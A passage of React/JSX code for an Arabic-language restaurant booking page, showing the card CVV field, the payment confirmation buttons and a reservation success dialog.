                    placeholder="123"
                    className={`text-left font-mono border-gray-200 ${errors.cvv ? "border-red-500" : ""}`}
                    dir="ltr"
                    data-testid="input-cvv"
                  />
                  {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
                </div>
              </div>

              <div className="flex gap-2 pt-2">
                <Button onClick={() => setStep(2)} variant="outline" className="flex-1 py-6" disabled={isProcessing} data-testid="button-back-step3">
                  السابق
                </Button>
                <Button
                  onClick={handleSubmitPayment}
                  className="flex-1 bg-[#c4a35a] hover:bg-[#b39349] py-6 text-white font-semibold"
                  disabled={isProcessing}
                  data-testid="button-submit-payment"
                >
                  {isProcessing ? "جاري المعالجة..." : "تأكيد الدفع"}
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Success Dialog */}
      <Dialog open={showSuccess} onOpenChange={setShowSuccess}>
        <DialogContent className="max-w-sm text-center border-0 shadow-2xl bg-white" dir="rtl">
          <div className="py-8">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Check className="w-8 h-8 text-green-600" />
            </div>
            <h3 className="text-xl font-bold text-[#3d3428] mb-2">تم الحجز بنجاح!</h3>
            <p className="text-gray-600 mb-2">تم تأكيد حجزك في</p>
            <p className="text-lg font-semibold text-[#c4a35a] mb-4">{selectedRestaurant?.name}</p>
            <p className="text-sm text-gray-500 mb-6">سيتم التواصل معك قريباً لتأكيد التفاصيل</p>
            <Button
              onClick={() => setShowSuccess(false)}
              className="w-full bg-[#3d3428] hover:bg-[#2a241c] py-5 text-white"
              data-testid="button-close-success"
            >
              حسناً
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
